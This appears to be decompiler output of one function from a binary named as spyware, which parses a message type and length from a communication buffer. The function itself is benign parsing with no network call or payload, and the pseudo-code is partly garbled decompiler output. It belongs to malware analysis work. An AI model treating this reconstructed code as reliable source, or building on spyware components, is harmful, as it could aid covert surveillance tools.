fn spyware::communication::serialization::extract_msg_type_and_length(a0: i32) -> u64 {
    let v0: u32;  // [bp-0x34]
    let v1: struct24;  // [bp-0x30]
    let v2: Result<struct4, struct8>;  // [bp-0x18]

    v0 = a0;
    v1 = struct24 {
        field_0: <core::ops::range::Range<usize> as core::slice::index::SliceIndex<[T]>>::index(&v0)
        field_8: ""
    };
    v2 = byteorder::io::ReadBytesExt::read_u32(&v1);
    return core::result::Result<T,E>::unwrap(&v2);
}
